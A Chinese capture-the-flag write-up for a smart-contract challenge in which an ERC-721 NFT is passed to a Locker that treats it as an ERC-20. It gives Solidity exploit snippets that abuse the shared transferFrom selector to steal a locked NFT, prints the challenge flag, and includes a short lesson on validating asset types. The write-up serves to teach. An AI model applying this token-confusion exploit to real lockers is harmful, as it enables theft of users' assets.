# Locker

## 题目简述

Setup 铸造编号为 `1337` 的 `GreyNFT`，并把它锁进 `Locker` 一年，接收者设为 `0xdead`。玩家可领取 $500$ GREY，目标是在等待期内成为 NFT 1337 的所有者。

漏洞来自接口混淆：`GreyNFT` 是 ERC-721，但它的 `transferFrom(address,address,uint256)` 函数选择器与 ERC-20 完全相同；`Locker.lockToken` 又允许把任意地址当 ERC-20 调用。

## 解题过程

先领取 $500$ GREY，其中 $100$ GREY 足以通过 `GreyNFT.mintNFT` 铸造一个编号小于 1337 的 NFT，例如编号 1。将 NFT 1 授权给 Locker 后，故意调用 ERC-20 路径：

```solidity
setup.claim();
setup.grey().approve(address(setup.greyNFT()), 100e18);
setup.greyNFT().mintNFT(1);
setup.greyNFT().approve(address(setup.locker()), 1);

uint256 lockId = setup.locker().lockToken(
    address(setup.greyNFT()),
    1,
    0,
    address(this)
);
```

`lockToken` 内部的 `safeTransferFrom(msg.sender, locker, amount)` 被 ABI 编码成选择器相同的三参数 `transferFrom`。对 GreyNFT 来说，第三个参数不是代币数量，而是 NFT id，所以 NFT 1 被转入 Locker；同时 ERC-20 锁记录中的 `amount` 被记为 1，解锁时间立即到期。

接着调用：

```solidity
setup.locker().unlockToken(lockId, 1337);
```

Solidity 0.8 本应阻止 `lock.amount -= 1337` 下溢，因此利用还需要借助 `unlockToken` 中的第二个接口错误：它调用 `safeTransferFrom(address(this), msg.sender, amount)`，对 NFT 来说仍解释为转移 token id。为了避开减法检查，应先让 ERC-20 记录中的 `amount` 足够大，而对应 NFT id 又可由玩家先铸造。例如铸造 NFT 1338，把 `amount=1338` 当作锁入的 NFT id；之后以 `amount=1337` 解锁，记录余额变为 1，同时三参数调用把 Locker 已持有的 NFT 1337 转给玩家：

```solidity
setup.greyNFT().mintNFT(1338);
setup.greyNFT().approve(address(setup.locker()), 1338);
uint256 id = setup.locker().lockToken(
    address(setup.greyNFT()), 1338, 0, address(this)
);
setup.locker().unlockToken(id, 1337);
```

于是 `ownerOf(1337)` 变为玩家地址，取得：

```text
grey{token_confusion_64c46db}
```

## 方法总结

合约不能仅靠“接口长得一样”来判断资产标准。ERC-20 和 ERC-721 的三参数 `transferFrom` 共用选择器，而第三个参数分别代表数量和 token id；当通用 Locker 未验证 ERC-165 或资产类型时，就会产生类型混淆。利用还需同时满足 Solidity 算术检查，因此应选择大于目标 NFT id 的自有 id，让记账减法合法、实际跨标准调用却转走另一个 NFT。
